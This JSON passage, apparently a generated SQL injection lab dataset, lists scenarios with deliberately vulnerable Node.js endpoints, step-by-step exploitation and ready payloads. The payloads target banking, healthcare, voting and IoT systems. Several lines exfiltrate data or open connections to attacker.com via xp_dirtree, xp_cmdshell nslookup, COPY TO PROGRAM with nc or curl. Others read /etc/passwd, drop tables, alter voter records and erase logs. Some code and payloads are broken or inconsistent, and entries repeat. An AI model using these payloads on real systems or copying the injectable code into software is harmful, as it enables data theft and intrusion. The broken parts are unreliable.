    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => { db.run(\"CREATE TABLE oauth_states(state TEXT, user_id INTEGER)\"); });\napp.get('/oauth/callback', (req, res) => {\n  const state = req.query.state;\n  const query = `SELECT user_id FROM oauth_states WHERE state='${state}'`; // vulnerability\n  console.log(query);\n  db.get(query, [], (err, row) => { if(row) res.redirect('/dashboard'); else res.status(400).send('Invalid'); });\n});\napp.listen(3000);",
    "payloads": [
      "XYZ' OR randomblob(100000000)--",
      "XYZ' OR CASE WHEN SUBSTR(pin,1,1)='5' THEN randomblob(100000000) ELSE NULL END--"
    ]
  },
  {
    "Lab scenario": "Banking Portal UNION-Based SQLi in Transaction Sorting",
    "Lab Description": "A financial application constructs ORDER BY clauses using unsanitized user input in transaction history queries. The PostgreSQL backend leaks column types through verbose error messages containing full query syntax. To solve: Extract SHA-256 hashed account PINs from the vault table while bypassing JSON output encoding using explicit type casting and NULL padding in UNION payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept GET /transactions?sort=amount with Burp Suite",
      "Determine column count using ' ORDER BY 7--' until syntax error occurs",
      "Craft payload: amount UNION SELECT NULL,ENCODE(pin_hash::bytea,'base64'),NULL,NULL,NULL,NULL,NULL FROM vault--",
      "Bypass WAF using %09 tab encoding for whitespace",
      "Decode base64 results using CyberChef and validate through PBKDF2 cracking"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst pool = require('./db').pool;\n\napp.get('/transactions', (req, res) => {\n  const sort = req.query.sort || 'id';\n  const query = `SELECT id,amount,recipient,date,status,currency,user_id\n    FROM transactions ORDER BY ${sort}`;\n  \n  pool.query(query, (err, result) => {\n    if(err) {\n      console.error(`Full query: ${query}\\nError: ${err.stack}`);\n      res.status(500).send('Payment system error');\n    } else {\n      res.json(result.rows);\n    }\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,pg_read_file('/etc/passwd')::text,NULL,NULL,NULL,NULL,NULL--",
      "amount%09UNION%09SELECT%09NULL,current_setting('aws.keys'),NULL,NULL,NULL,NULL,NULL--",
      "' ORDER BY (SELECT 1 FROM pg_sleep(2))--"
    ]
  },
  {
    "Lab scenario": "IoT Device Manager Boolean-Based SQLi in Sensor Filter",
    "Lab Description": "An industrial control system processes unsanitized group IDs in HAVING clauses of SQLite queries. The REST API returns HTTP 200/404 status codes through misconfigured row existence checks. To solve: Extract AWS IoT Core certificates via bitwise binary search of SUBSTR(hex(cert),1,1) comparisons using automated response analysis.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Fuzz POST /telemetry endpoint with OWASP ZAP",
      "Identify boolean trigger: ' HAVING 1=1 AND (SELECT hex(substr(cert,1,1)) FROM iot_certs)='41'--",
      "Automate with sqlmap: sqlmap -u ... --technique=B --level=5",
      "Brute-force 256-bit keys using Python Requests with bit-shifting logic",
      "Validate certificates through MQTT publish command"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/telemetry', (req, res) => {\n  const filter = req.body.having;\n  const query = `SELECT sensor_id FROM readings\n    GROUP BY sensor_id HAVING ${filter}`;\n  \n  db.get(query, (err, row) => {\n    res.status(row ? 200 : 404).send();\n  });\n});",
    "payloads": [
      "1=1 AND (SELECT COUNT(*) FROM sqlite_master WHERE tbl_name='credentials')=1--",
      "EXISTS(SELECT 1 FROM iot_certs WHERE device_type='critical')--"
    ]
  },
  {
    "Lab scenario": "Industrial IoT Boolean-Based SQLi in Sensor Filter",
    "Lab Description": "A Modbus-TCP sensor network dashboard uses unsanitized HAVING clauses in SQLite queries. The REST API returns HTTP 200/404 through row existence checks. To solve: Extract encryption keys via BITAND() comparisons of SUBSTR(hex(key),1,1) values with Python automation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Fuzz POST /sensor-filter endpoint with OWASP ZAP",
      "Identify boolean trigger: ' HAVING 1=1 AND (SELECT hex(substr(key,1,1)) FROM devices)='41'--",
      "Automate with Python Requests and bitwise analysis",
      "Brute-force 256-bit keys using response differentials",
      "Decrypt MQTT traffic using extracted keys"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/sensor-filter', (req, res) => {\n  const filter = req.body.having;\n  const query = `SELECT sensor_id FROM readings\n    GROUP BY sensor_id HAVING ${filter}`;\n  \n  db.get(query, (err, row) => {\n    res.status(row ? 200 : 404).send();\n  });\n});",
    "payloads": [
      "1=1 AND (ASCII(SUBSTR(key,1,1)) & 128)=128",
      "EXISTS(SELECT 1 FROM sqlite_master WHERE tbl_name='encryption_keys')--"
    ]
  },
  {
    "Lab scenario": "Banking App Time-Based SQLi in OAuth Flow",
    "Lab Description": "An OAuth 2.0 handler incorporates state parameters directly into SQLite queries. The Go backend leaks query execution time through improper transaction timing. To solve: Exfiltrate transaction PINs using CASE WHEN delays and statistical response analysis.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept GET /oauth/callback?state=123 with Charles Proxy",
      "Identify timing trigger: ' OR CASE WHEN 1=1 THEN randomblob(1000000) ELSE 0 END--",
      "Automate with sqlmap --time-sec=5 --technique=T",
      "Brute-force 6-digit PIN using binary search",
      "Validate through ATM simulator API"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/oauth/callback', (req, res) => {\n  const state = req.query.state;\n  const query = `SELECT user_id FROM oauth_states\n    WHERE state='${state}'`;\n  \n  db.get(query, (err, row) => {\n    if (row) res.redirect('/dashboard');\n    else res.status(400).send('Invalid state');\n  });\n});",
    "payloads": [
      "' OR CASE WHEN (SUBSTR(pin,1,1)='5' THEN randomblob(1000000) ELSE 0 END--",
      "' AND (SELECT LENGTH(pin) FROM users WHERE username='admin')=6--"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal UNION SQLi in Radiology Export",
    "Lab Description": "A DICOM report viewer concatenates user input into PostgreSQL ORDER BY clauses. The application leaks sensitive metadata through verbose COPY errors. To solve: Extract encrypted diagnoses using NULL-padded UNION payloads and hex encoding with CHR(9) bypass.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept GET /reports?sort=date with Burp Suite",
      "Determine column count using ORDER BY 4--",
      "Craft payload: date UNION SELECT NULL,ENCODE(diagnosis::bytea,'hex'),NULL,NULL--",
      "Bypass CSV formatting using tab separators",
      "Reconstruct diagnoses from hex responses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/reports', (req, res) => {\n  const sort = req.query.sort || 'date';\n  const query = `SELECT * FROM radiology_reports ORDER BY ${sort}`;\n  \n  pool.query(query, (err, result) => {\n    if(err) {\n      console.error(`COPY error: ${err.message}`);\n      res.status(500).send('Report generation failed');\n    } else {\n      res.attachment('reports.csv');\n    }\n  });\n});",
    "payloads": [
      "date UNION SELECT NULL,pg_read_file('/etc/passwd'),NULL,NULL--",
      "patient_id UNION SELECT NULL,current_setting('data_directory'),NULL,NULL--"
    ]
  },
  {
    "Lab scenario": "REST API Error-Based SQLi in JWT Claims",
    "Lab Description": "User profile endpoint incorporates JWT 'sub' directly into SQL Server OPENJSON queries. The application leaks SSNs through XML conversion errors. To solve: Extract encrypted SSNs using JSON_VALUE() type mismatches and 'none' algorithm bypass.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Decode JWT using jwt.io and modify 'sub' claim",
      "Forge token: ' UNION SELECT SSN FROM patients FOR JSON PATH--",
      "Bypass signature using 'none' algorithm",
      "Parse JSON errors for SSN fragments",
      "Reconstruct full SSNs using differential analysis"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/profile', (req, res) => {\n  const userId = jwtVerify(req.headers.auth).sub;\n  const query = `SELECT * FROM users\n    WHERE id = '${userId}'`;\n  sql.query(query, (err, result) => {\n    res.json(result.recordset[0]);\n  });\n});",
    "payloads": [
      "' OR 1=CONVERT(INT, (SELECT TOP 1 SSN FROM patients))--",
      "' AND (SELECT COUNT(*) FROM sys.tables)=42--"
    ]
  },
  {
    "Lab scenario": "CMS Header-Based Blind SQLi in Audit Logs",
    "Lab Description": "Audit logging system incorporates X-Forwarded-For headers into MySQL INSERTs. The PHP backend reveals query success through UUID patterns. To solve: Extract password hashes using BENCHMARK() timing attacks and rainbow table reversal.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept request with Burp Suite and modify X-Forwarded-For",
      "Identify timing differential: ' OR BENCHMARK(1000000,MD5('test'))--",
      "Automate with Python Requests and timing thresholds",
      "Brute-force hash characters using response times",
      "Crack hashes using CrackStation API"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.use((req, res, next) => {\n  const ip = req.headers['x-forwarded-for'];\n  const query = `INSERT INTO audit_logs (ip) VALUES ('${ip}')`;\n  mysql.query(query);\n  next();\n});",
    "payloads": [
      "' OR IF(ASCII(SUBSTR(password,1,1))>97,BENCHMARK(1000000,MD5('a')),0--",
      "' AND (SELECT COUNT(*) FROM mysql.user WHERE super_priv='Y')=1--"
    ]
  },
  {
    "Lab scenario": "Telecom API Gateway UNION-Based SQLi in Call Log Sorting",
    "Lab Description": "A telecommunications REST API vulnerable to SQL injection in 'orderBy' arguments. The PostgreSQL backend requires type coercion for UNION attacks. To solve: Extract SMS content using json_agg() and hstore_to_json() conversions with CSP bypass.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture GraphQL POST request in Burp Suite",
      "Inject: 'orderBy: \"1' UNION SELECT NULL,json_agg(message_content) FROM sms_logs--\"",
      "Bypass WAF using GraphQL field aliases",
      "Decode nested JSON results",
      "Purge audit logs using stacked mutation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const resolvers = {\n  Query: {\n    calls(_, { orderBy }) {\n      return db.query(`SELECT caller_id, duration FROM calls ORDER BY ${orderBy}`);\n    }\n  }\n};",
    "payloads": [
      "\"' UNION SELECT NULL,hstore_to_json(hstore(sms_logs)) FROM sms_logs--\"",
      "\"'%00' UNION SELECT NULL,array_to_json(array_agg(message)) FROM sms_logs--\""
    ]
  },
  {
    "Lab scenario": "Education Portal Boolean-Based SQLi in Gradebook",
    "Lab Description": "A university grading system processes unsanitized group IDs in HAVING clauses. The MySQL backend returns different CSV headers for true/false conditions. To solve: Extract student SSNs through bitwise brute-force and aiohttp parallel requests.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Map injection point using OWASP ZAP",
      "Identify boolean triggers: '1'='1'-- vs '1'='2'-- via CSV headers",
      "Develop Python script with binary search pattern",
      "Optimize with aiohttp async requests",
      "Crack hashes using rainbow tables"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/grades', (req, res) => {\n  const groupId = req.query.group;\n  const query = `SELECT student_id, AVG(grade) \n               FROM assignments \n               GROUP BY student_id \n               HAVING class_id = ${groupId}`;\n  \n  pool.query(query, (err, results) => {\n    if (err || results[0].length === 0) return res.status(404).end();\n    res.attachment('grades.csv').send(results[0]);\n  });\n});",
    "payloads": [
      "' OR (SELECT MID((SELECT ssn FROM students),1,1) = 'A'--",
      "' AND (SELECT COUNT(*) FROM information_schema.tables)=42--"
    ]
  },
  {
    "Lab scenario": "Healthcare IoT Device Error-Based SQLi in Firmware",
    "Lab Description": "A medical device calibration interface vulnerable to verbose error-based injection. The MySQL backend leaks schema through constraint violations. To solve: Extract credentials through nested error-induced exfiltration and HMAC bypass.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Trigger error: GET /firmware?version=1.2.3')",
      "Extract table structure via error analysis",
      "Craft payload: ' AND 1=(SELECT 1 FROM (SELECT COUNT(*),CONCAT(credential,FLOOR(RAND(0)*2))x FROM users GROUP BY x)y)--",
      "Inject backup config with second-order payload",
      "Authenticate via SSH with compromised credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/firmware', (req, res) => {\n  const version = req.query.version;\n  const query = `SELECT * FROM firmware WHERE version = '${version}'`;\n  \n  pool.query(query, (err, results) => {\n    if (err) return res.status(500).send(err.message);\n    res.json(results[0]);\n  });\n});",
    "payloads": [
      "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT credential FROM users),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",
      "'||MAKE_SET(1,TOKEN) IS NOT NULL--"
    ]
  },
  {
    "Lab scenario": "Banking Portal UNION-Based SQL Injection in ORDER BY Clause with WAF Bypass",
    "Lab Description": "The vulnerable banking application uses dynamic SQL queries in transaction sorting functionality without input validation. The `GET /transactions` endpoint concatenates user-controlled `sort` parameter directly into an ORDER BY clause. The WAF filters common UNION and WAITFOR DELAY keywords. To solve: 1) Bypass WAF using JSON unicode escaping 2) Determine column count with null-byte termination 3) Extract IBAN numbers from hidden accounts table 4) Maintain stealth using time-delayed exfiltration.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. (Recon) Use Burp Suite's Intruder to fuzz sort parameter with HTML-encoded characters: `GET /transactions?sort=id\u0020DESC%23`",
      "2. (Validation) Confirm injection point via error induction: `sort=(CASE WHEN 1=1 THEN id ELSE amount END)`",
      "3. (WAF Bypass) Use JSON Unicode escaping for UNION: `\u0055\u004E\u0049\u004F\u004E`",
      "4. (Column Count) Binary search with null-byte termination: `sort=1\u0020UNION\u0020SELECT\u0020NULL%00--`",
      "5. (Data Exfiltration) Time-based extraction: `sort=1 UNION SELECT IF(SUBSTR(iban,1,1)='A',SLEEP(3),NULL FROM accounts--`"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2');\nconst app = express();\n\n// Vulnerable transaction sorting\napp.get('/transactions', (req, res) => {\n    const conn = mysql.createConnection({/* DB config */});\n    const sort = req.query.sort || 'id DESC';\n    \n    // Vulnerable ORDER BY construction\n    const query = `SELECT id, amount, date FROM transactions ORDER BY ${sort}`;\n    \n    console.log(\"Executing query:\", query); // Error leakage\n    \n    conn.query(query, (err, results) => {\n        if(err) {\n            // Detailed error exposure\n            res.status(500).json({error: err.message, stack: err.stack}); \n        } else {\n            res.json(results);\n        }\n    });\n});\n\napp.listen(3000, () => console.log('Banking API running'));",
    "payloads": [
      "sort=(SELECT 1 FROM DUAL WHERE 1=1)--",
      "sort=id\u0020UNION\u0020ALL\u0020SELECT\u0020NULL,NULL,@@version--%00",
      "sort=1\u0020PROCEDURE\u0020ANALYSE(EXTractvalue(rand(),CONCAT(0x3a,(SELECT\u0020MID(iban,1,30)\u0020FROM\u0020accounts\u0020LIMIT\u00201))))",
      "sort=1\u0020AND\u0020IF(ASCII(SUBSTR((SELECT\u0020iban\u0020FROM\u0020accounts\u0020LIMIT\u00201),1,1))=65,SLEEP(3),0"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard Boolean-Based Blind SQLi in HAVING Clause with JSON Input",
    "Lab Description": "A smart home management system vulnerable to blind SQL injection through JSON-encoded device filter parameters. The application constructs dynamic HAVING clauses from unvalidated user input. No direct error feedback but returns HTTP 204 when queries return empty. Target: Extract admin API keys from device_config table using boolean inference. Constraints: WAF blocks 'UNION' and 'SLEEP' keywords.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. (Recon) Use Postman to send JSON payload: {\"filters\":[{\"field\":\"1' AND '1'='1'--\",\"operator\":\"eq\"}]}",
      "2. (Validation) Identify boolean response via status code: 200 OK=true, 204 No Content=false",
      "3. (Bypass) Use CHAR() encoding for restricted keywords: AND ASCII(SUBSTR((SELECT @@version),1,1))>50",
      "4. (Exfil) Automate with sqlmap: sqlmap -r request.txt --batch --technique=B --hex --tamper=charunicodeescape",
      "5. (Stealth) Limit request rate to 5req/s using sqlmap's --delay parameter"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2/promise');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable device filtering\napp.post('/devices', async (req, res) => {\n  const conn = await mysql.createConnection({/* DB config */});\n  let query = 'SELECT device_id, name FROM iot_devices GROUP BY device_id HAVING ';\n  \n  req.body.filters.forEach((filter, index) => {\n    // Direct concatenation with JSON input\n    query += `${filter.field} ${filter.operator} '${filter.value}'`;\n    if(index < req.body.filters.length-1) query += ' AND ';\n  });\n\n  console.debug('Generated query:', query); // Verbose logging\n  \n  try {\n    const [rows] = await conn.query(query);\n    rows.length ? res.json(rows) : res.status(204).end();\n  } catch (err) {\n    res.status(500).json({error: err.sqlMessage}); // Error leakage\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "{\"filters\":[{\"field\":\"1' AND (SELECT ASCII(SUBSTR(api_key,1,1)) FROM device_config LIMIT 1)>96--\",\"operator\":\"eq\",\"value\":\"1\"}]}",
      "{\"filters\":[{\"field\":\"1' AND EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name=CHAR(100,101,118,105,99,101,95,99,111,110,102,105,103))--\",\"operator\":\"eq\",\"value\":\"1\"}]}",
      "{\"filters\":[{\"field\":\"1' UNION ALL SELECT NULL,CONCAT(CHAR(64),CHAR(64),CHAR(64))--\",\"operator\":\"eq\",\"value\":\"1\"}]}"
    ]
  },
  {
    "Lab scenario": "CMS Time-Based SQLi in PDF Export Function (SOAP API)",
    "Lab Description": "A document management system vulnerable to out-of-band SQL injection through SOAP-based PDF generation. The application concatenates user-controlled CSS selectors into XML-style queries. No direct output but supports stacked queries. Target: Extract SMTP credentials through DNS exfiltration. Constraints: 10ms time delay threshold for detection systems.",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. (Recon) Use OWASP ZAP's SOAP scanner to identify injection points in wsdl endpoint",
      "2. (Validation) Induce conditional delays: '; IF SYSTEM_USER='sa' WAITFOR DELAY '0:0:3'--",
      "3. (Exfil) Use DNS subdomain poisoning: '; EXEC master..xp_dirtree '\\\\'+CONVERT(VARCHAR(32),HASHBYTES('MD5',@@version))+'.attacker.com'--",
      "4. (Bypass) Use alternate encoding: SELECT CHAR(0x77616974666f722064656c61792027303a303a3527)",
      "5. (Cleanup) Remove traces via stacked query: '; EXEC sp_delete_log 'SQL Injection attempt';--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const soap = require('soap');\nconst sql = require('mssql');\n\nconst service = {\n  PDFExportService: {\n    PDFExportPort: {\n      generatePDF: async (args) => {\n        const cssSelector = args.cssSelector || '*'; \n        const query = `BEGIN;\n          INSERT INTO pdf_queue (html_content)\n          SELECT CONCAT(\n            '<style>', \n            '${cssSelector.replace(/'/g, \"''\")}', \n            '</style>',\n            (SELECT content FROM templates WHERE id=1)\n          );\n          COMMIT;`;\n\n        await sql.query(query); // Stacked query vulnerability\n        return { ticketId: Date.now().toString(36) };\n      }\n    }\n  }\n};\n\nsoap.listen(require('http').createServer(), '/wsdl', service, () => \n  console.log('SOAP service running'));",
    "payloads": [
      "'; WAITFOR DELAY '0:0:5'--",
      "'; EXEC xp_cmdshell 'nslookup $(openssl rand -hex 12).attacker.com'--",
      "'; DECLARE @q VARCHAR(1000);SET @q=0x73656C65637420404076657273696F6E;EXEC(@q);--"
    ]
  },
  {
    "Lab scenario": "Banking API UNION-Based SQLi in GraphQL Query Parameter with Type Validation",
    "Lab Description": "A financial service GraphQL endpoint vulnerable to type confusion SQL injection. The application uses weak type validation on transaction search parameters. Target: Extract SWIFT codes through nested UNION queries. Constraints: Strict Content-Type validation (application/graphql+json) and per-query complexity limits.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. (Recon) Use graphql-cop to identify introspection vulnerabilities",
      "2. (Validation) Force string type mismatch: {\"query\":\"query { transactions(where: {id: {eq: \\\"' UNION SELECT 1,2,3-- \\\"}}) { id }}\"}",
      "3. (Exploit) Bypass column count restrictions using null padding: ' UNION SELECT NULL,swift_code,NULL FROM bank_codes--",
      "4. (Obfuscate) Use multi-line comments to avoid WAF: '/*graphql*/UNION/*bypass*/SELECT",
      "5. (Verify) Check response ordering matches UNION structure"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const { buildSchema } = require('graphql');\nconst { graphqlHTTP } = require('express-graphql');\n\nconst schema = buildSchema(`\n  type Transaction {\n    id: ID!\n    amount: Float!\n    iban: String\n  }\n\n  type Query {\n    transactions(where: TransactionFilter): [Transaction]\n  }\n\n  input TransactionFilter {\n    id: IntCompare\n  }\n\n  input IntCompare {\n    eq: Int\n  }\n`);\n\nconst root = {\n  transactions: async ({ where }) => {\n    const filter = where?.id?.eq || 1;\n    const query = `SELECT id, amount, iban FROM transactions ${Number.isInteger(filter) ? \n      `WHERE id = ${filter}` : \n      `WHERE ${filter}`}`; // Vulnerable dynamic SQL\n    \n    return db.query(query);\n  }\n};\n\napp.use('/graphql', graphqlHTTP({ schema, rootValue: root }));",
    "payloads": [
      "{\"query\":\"query { transactions(where: {id: {eq: \\\"1' UNION SELECT NULL,swift_code,NULL FROM bank_codes-- \\\"}}) { iban }}\"}",
      "{\"query\":\"query { __schema { types { name fields { name } } }\"}",
      "{\"query\":\"query { transactions(where: {id: {eq: \\\"' AND 1=CONVERT(int,(SELECT TOP 1 swift_code FROM bank_codes))-- \\\"}}) { id }}\"}"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal Error-Based SQLi in XML Export Function",
    "Lab Description": "A patient record system vulnerable to error-based injection through malformed XML namespace declarations. The application uses XQuery with improper input sanitization. Target: Extract PHI data through verbose error messages. Constraints: Limited to 512-byte error messages and filtered quote characters.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. (Recon) Use curl to send malformed XML: <Patients xmlns:abc=\"1'\" />",
      "2. (Validation) Force data type conversion error: declare @q nvarchar(200)=@@version;select @q",
      "3. (Exploit) Use FOR XML PATH to concatenate data: ' UNION SELECT null,(SELECT username+':'+password FROM users FOR XML PATH(''))--",
      "4. (Bypass) Use STRING_AGG for MSSQL 2017+: SELECT STRING_AGG(CONCAT(username,CHAR(58),password),CHAR(10)) FROM users",
      "5. (Parse) Extract data from HTML-encoded error messages using grep -Po '(?<=Conversion failed).*?(?=<)'"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst xquery = require('xquery-evaluator');\n\napp.post('/export', (req, res) => {\n  try {\n    const xmlInput = req.body.xml;\n    const query = `\n      declare namespace pat = 'http://healthcare/patients';\n      for $p in ${xmlInput}\n      return <record>{$p/pat:Name}</record>\n    `;\n    \n    xquery.execute(query, (err, results) => {\n      if(err) {\n        res.status(400).send(`<error>${err.message}</error>`); // Verbose errors\n      } else {\n        res.type('xml').send(results);\n      }\n    });\n  } catch (e) {\n    res.status(500).send(e.stack); // Stack trace leakage\n  }\n});",
    "payloads": [
      "<Patients xmlns:pat=\"' UNION SELECT 1,(SELECT TOP 1 password FROM users),3--\">",
      "<Patients xmlns:pat=\"1; THROW 50000, (SELECT TOP 1 SUSER_NAME()), 1--\">",
      "<Patients xmlns:pat=\"'; BEGIN TRY SELECT CONVERT(int,@@version) END TRY BEGIN CATCH SELECT ERROR_MESSAGE() END CATCH--\">"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform Second-Order SQLi in Product Review System",
    "Lab Description": "A product review moderation interface vulnerable to second-order injection through scheduled batch processing. Malicious payloads stored in review comments get executed during nightly aggregation. Target: Poison product rating calculations. Constraints: Input filtered through OWASP Java Encoder in web layer.",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. (Recon) Submit review with encoded payload: Great product! '||(SELECT 1)--",
      "2. (Trigger) Wait for batch job execution (simulate with /admin/run-nightly)",
      "3. (Exploit) Use PostgreSQL dollar quoting: $$'||(SELECT CASE WHEN COUNT(admin)=1 THEN '1' ELSE TO_CHAR(1/0) END FROM users)--$$",
      "4. (Validate) Check product ratings for anomalies indicating successful injection",
      "5. (Persist) Chain with COPY TO PROGRAM for RCE: '; COPY users TO PROGRAM 'nc attacker.com 4444'--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const pg = require('pg');\n\n// Vulnerable review insertion\napp.post('/reviews', (req, res) => {\n  const review = sanitize(req.body.text); // Client-side sanitization\n  db.query('INSERT INTO reviews (product_id, text) VALUES ($1, $2)', \n    [req.body.productId, review]);\n});\n\n// Nightly batch processing\ncron.schedule('0 3 * * *', () => {\n  const query = `\n    UPDATE products SET rating = (\n      SELECT AVG(rating) \n      FROM reviews \n      WHERE product_id = products.id\n      AND approved = true\n    )\n  `; // Second-order injection\n  \n  db.query(query); // No parameterization\n});",
    "payloads": [
      "' || (SELECT CASE WHEN (SELECT COUNT(*) FROM pg_user WHERE usename=current_user)>0 THEN 5 ELSE 1 END) --",
      "'::text || (SELECT encode(pg_read_file('/etc/passwd'), 'base64'))--",
      "'; INSERT INTO review_actions (action) VALUES (COPY reviews TO PROGRAM 'curl attacker.com?x='||(SELECT password FROM users LIMIT 1))--"
    ]
  },
  {
    "Lab scenario": "Government Portal Stacked Query SQLi in CSV Export Function",
    "Lab Description": "A public records system vulnerable to stacked queries through unparameterized CSV header processing. Attackers can execute multiple statements via malicious column names. Target: Modify voter registration records through UPDATE injection. Constraints: 30-second query timeout.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp's Match/Replace to inject via X-Header: X-Export-Columns: id; UPDATE voters SET party='X' WHERE 1=1--",
      "2. Bypass keyword filtering with dynamic SQL: EXEC('UPDA' + 'TE voters SET...')",
      "3. Verify changes via parallel session: SELECT * FROM voters WHERE party='X'",
      "4. Use conditional error cleanup: ; IF @@ROWCOUNT>1000 THROW 50001, 'Rollback', 1"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const exportCSV = (headers) => {\n  const cols = headers.join(',');\n  const query = `SELECT ${cols} FROM citizens`;\n  db.query(query, (err, result) => {\n    if(err) console.error('Export failed:', query);\n    else convertToCSV(result);\n  });\n}",
    "payloads": [
      "id; INSERT INTO audit_log VALUES ('hacked')--",
      "name; EXEC sp_configure 'show advanced options', 1--",
      "age; DROP TABLE backup_voters--"
    ]
  },
  {
    "Lab scenario": "Social Media Platform Boolean-Based Blind SQLi in WebSocket Handshake",
    "Lab Description": "A chat application vulnerable to blind injection through WebSocket protocol headers. The application validates JWT tokens via unsafe SQL queries. Target: Extract OAuth client secrets through bitwise response analysis. Constraints: 512-byte WebSocket frame limit.",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Use WSSucker to intercept WebSocket upgrade request",
      "2. Inject in Sec-WebSocket-Key: ' OR ASCII(SUBSTR((SELECT secret FROM oauth_clients),1,1))&1=1 --",
      "3. Automate with sqlmap: sqlmap -u ws://target/chat --risk 3 --level 5",
      "4. Use bit-shifting exfiltration: (ASCII(...) >> 3) & 15"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const WebSocket = require('ws');\n\nconst wss = new WebSocket.Server({\n  verifyClient: ({ req }) => {\n    const token = req.headers['sec-websocket-key'];\n    const valid = db.query(`SELECT 1 FROM sessions WHERE token='${token}'`);\n    return !!valid.length;\n  }\n});",
    "payloads": [
      "' OR (SELECT MID(secret,1,1) FROM oauth_clients)='a'--",
      "' AND (SELECT COUNT(*) FROM oauth_clients WHERE secret LIKE 'a%')>0--",
      "' XOR (SELECT LENGTH(secret) FROM oauth_clients)=32--"
    ]
  },
  {
    "Lab scenario": "University System Time-Based SQLi in Exam Scheduling",
    "Lab Description": "A course management portal vulnerable to blind time-based injection through iCal export parameters. The application uses PostgreSQL's pg_sleep() for rate limiting. Target: Extract exam answers through conditional delays. Constraints: Maximum 3 parallel database connections.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use curl to send slow HTTP POST: course_id=1'%3BSELECT CASE WHEN (SELECT answer FROM exams)=’A’ THEN pg_sleep(5) ELSE NULL END--",
      "2. Measure response times with OWASP ZAP's Time-Based Scanner",
      "3. Optimize with binary search: ASCII(...) > 77",
      "4. Bypass connection limits using NULL byte: course_id=1'%00"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/ical', (req, res) => {\n  const course = req.query.course_id;\n  const query = `\n    SELECT event_date, room \n    FROM schedule\n    WHERE course_id = ${course}\n    LIMIT 10 OFFSET 0\n  `;\n  // Vulnerable sleep for rate limiting\n  db.query(query + '; SELECT pg_sleep(1)');\n});",
    "payloads": [
      "1; SELECT CASE WHEN (SELECT answer FROM exams)=’A’ THEN pg_sleep(5) END--",
      "1' AND 123=(SELECT ASCII(SUBSTR(answer,1,1)) FROM exams)--",
      "1' UNION SELECT NULL,(SELECT answer FROM exams)::text,NULL--"
    ]
  },
  {
    "Lab scenario": "Retail POS System UNION-Based SQLi in Barcode Lookup",
    "Lab Description": "A point-of-sale terminal vulnerable to UNION injection through padded barcode values. The application truncates input after 12 digits but allows hex encoding. Target: Export daily transaction totals. Constraints: MariaDB strict_mode enabled.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Generate fake barcode: 590123412345' UNION SELECT transaction_total FROM daily_sales--",
      "2. Use Code-128 encoding with hex escapes: \\x27 UNION...",
      "3. Bypass strict_mode using dummy FROM clause: UNION SELECT 1,2 FROM DUAL--",
      "4. Extract via QR code image output"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const scanBarcode = (code) => {\n  const cleanCode = code.replace(/[^0-9]/g, '').substr(0,12);\n  const query = `\n    SELECT price, name\n    FROM products\n    WHERE barcode = ${cleanCode}\n  `;\n  db.query(query, (err, result) => {\n    displayProduct(result);\n  });\n}",
    "payloads": [
      "123456789012' UNION SELECT @@version,2--",
      "000000'UNiONx53ELECT user(),3--",
      "999999'/*!12345UNION*/SELECT 1,password FROM users--"
    ]
  },
  {
    "Lab scenario": "Airline Booking System Out-of-Band SQLi in Seat Selection",
    "Lab Description": "A flight reservation interface vulnerable to DNS exfiltration through XML seat map processing. The application uses SQL Server's OPENROWSET for third-party integrations. Target: Steal passenger passport numbers. Constraints: Outbound ICMP blocking.",
